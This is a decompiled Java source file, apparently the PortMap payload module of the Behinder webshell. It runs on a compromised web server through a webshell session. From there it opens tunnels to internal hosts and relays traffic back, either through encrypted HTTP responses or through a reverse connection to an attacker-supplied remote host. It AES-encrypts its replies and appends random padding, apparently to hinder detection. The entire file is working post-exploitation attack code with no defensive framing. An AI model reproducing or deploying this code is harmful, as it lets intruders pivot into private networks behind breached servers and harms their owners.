package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class PortMap implements Runnable {
   public static String action;
   public static String targetIP;
   public static String targetPort;
   public static String socketHash;
   public static String remoteIP;
   public static String remotePort;
   public static String extraData;
   private Object Request;
   private Object Response;
   private Object Session;
   String localKey;
   String remoteKey;
   String type;
   Object httpSession;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var14 = false;

      Object so;
      Method write;
      label157: {
         try {
            var14 = true;
            this.fillContext(obj);
            String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
            if (action.equals("createLocal")) {
               this.createTunnel(localSessionKey);
               var14 = false;
            } else if (action.equals("read")) {
               byte[] data = this.doRead(localSessionKey);
               result.put("status", "success");
               result.put("msg", base64encode(data));
               var14 = false;
            } else if (action.equals("write")) {
               this.doWrite(localSessionKey);
               result.put("status", "success");
               result.put("msg", "ok");
               var14 = false;
            } else if (action.equals("closeLocal")) {
               this.closeLocal();
               result.put("status", "success");
               result.put("msg", "ok");
               var14 = false;
            } else if (action.equals("createRemote")) {
               (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
               result.put("status", "success");
               result.put("msg", "ok");
               var14 = false;
            } else if (!action.equals("closeRemote")) {
               var14 = false;
            } else {
               this.sessionSetAttribute(this.Session, "remoteRunning", false);
               Enumeration attributeNames = this.sessionGetAttributeNames(this.Session);

               while(attributeNames.hasMoreElements()) {
                  String attrName = attributeNames.nextElement().toString();
                  if (attrName.startsWith("remote")) {
                     this.sessionRemoveAttribute(this.Session, attrName);
                  }
               }

               result.put("status", "success");
               result.put("msg", "ok");
               var14 = false;
            }
            break label157;
         } catch (Exception var18) {
            var18.printStackTrace();
            result.put("status", "fail");
            result.put("msg", var18.getMessage());
            var14 = false;
         } finally {
            if (var14) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var15) {
                  var15.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var16) {
            var16.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var17) {
         var17.printStackTrace();
      }

      return true;
   }

   private void createTunnel(String localSessionKey) throws Exception {
      String target = targetIP;
      int port = Integer.parseInt(targetPort);
      SocketChannel socketChannel = SocketChannel.open();
      socketChannel.connect(new InetSocketAddress(target, port));
      socketChannel.configureBlocking(false);
      this.sessionSetAttribute(this.Session, localSessionKey, socketChannel);
   }

   private byte[] doRead(String localSessionKey) throws Exception {
      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
      if (socketChannel == null) {
         this.createTunnel(localSessionKey);
      }

      socketChannel.configureBlocking(false);
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      ByteBuffer buf = ByteBuffer.allocate(512);

      int length;
      for(length = socketChannel.read(buf); length > 0; length = socketChannel.read(buf)) {
         byte[] data = Arrays.copyOfRange(buf.array(), 0, length);
         buf.clear();
         bos.write(data);
      }

      if (length == -1) {
         socketChannel.close();
         this.createTunnel(localSessionKey);
      }

      return bos.toByteArray();
   }

   private void doWrite(String localSessionKey) throws Exception {
      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, localSessionKey);
      if (socketChannel == null) {
         this.createTunnel(localSessionKey);
      }

      byte[] extraDataByte = this.base64decode(extraData);
      ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
      buf.clear();
      buf.put(extraDataByte);
      buf.flip();

      while(buf.hasRemaining()) {
         socketChannel.write(buf);
      }

   }

   private void closeLocal() {
      Enumeration attributeNames = this.sessionGetAttributeNames(this.Session);

      while(attributeNames.hasMoreElements()) {
         String attrName = attributeNames.nextElement().toString();
         if (attrName.startsWith("local_")) {
            this.sessionRemoveAttribute(this.Session, attrName);
         }
      }

   }

   public PortMap(String localKey, String remoteKey, String type, Object session) {
      this.localKey = localKey;
      this.remoteKey = remoteKey;
      this.httpSession = session;
      this.type = type;
   }

   public PortMap() {
   }

   public void run() {
      int bytesRead;
      if (this.type.equals("create")) {
         this.sessionSetAttribute(this.httpSession, "remoteRunning", true);

         while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
            try {
               String target = targetIP;
               int port = Integer.parseInt(targetPort);
               String vps = remoteIP;
               bytesRead = Integer.parseInt(remotePort);
               SocketChannel remoteSocketChannel = SocketChannel.open();
               remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
               String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
               this.sessionSetAttribute(this.httpSession, remoteKey, remoteSocketChannel);
               remoteSocketChannel.configureBlocking(true);
               SocketChannel localSocketChannel = SocketChannel.open();
               localSocketChannel.connect(new InetSocketAddress(target, port));
               localSocketChannel.configureBlocking(true);
               String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
               this.sessionSetAttribute(this.httpSession, localKey, localSocketChannel);
               (new Thread(new PortMap(localKey, remoteKey, "read", this.httpSession))).start();
               (new Thread(new PortMap(localKey, remoteKey, "write", this.httpSession))).start();
            } catch (Exception var12) {
               try {
                  Thread.sleep(3000L);
               } catch (InterruptedException var11) {
                  var11.printStackTrace();
               }
            }
         }
      } else {
         SocketChannel localSocketChannel;
         SocketChannel remoteSocketChannel;
         ByteBuffer buf;
         OutputStream so;
         if (!this.type.equals("read")) {
            if (this.type.equals("write")) {
               while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
                  try {
                     localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
                     remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                     buf = ByteBuffer.allocate(512);
                     bytesRead = remoteSocketChannel.read(buf);

                     for(so = localSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = remoteSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                     }

                     so.flush();
                     so.close();
                  } catch (IOException var13) {
                     try {
                        Thread.sleep(10L);
                     } catch (Exception var9) {
                     }
                  }
               }
            }
         } else {
            while((Boolean)this.sessionGetAttribute(this.httpSession, "remoteRunning")) {
               try {
                  localSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.localKey);
                  remoteSocketChannel = (SocketChannel)this.sessionGetAttribute(this.httpSession, this.remoteKey);
                  buf = ByteBuffer.allocate(512);
                  bytesRead = localSocketChannel.read(buf);

                  for(so = remoteSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
                     so.write(buf.array(), 0, bytesRead);
                     so.flush();
                     buf.clear();
                  }

                  so.flush();
                  so.close();
               } catch (IOException var14) {
                  try {
                     Thread.sleep(10L);
                  } catch (Exception var10) {
                  }
               }
            }
         }
      }

   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private void doOutPut(Object response, byte[] data) throws Exception {
      Object so = response.getClass().getMethod("getOutputStream").invoke(response);
      Method write = so.getClass().getMethod("write", byte[].class);
      write.invoke(so, data);
      so.getClass().getMethod("flush").invoke(so);
      so.getClass().getMethod("close").invoke(so);
   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      bos.write(encrypted);
      bos.write(this.getMagic());
      return bos.toByteArray();
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private static String base64encode(byte[] content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content);
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }
}
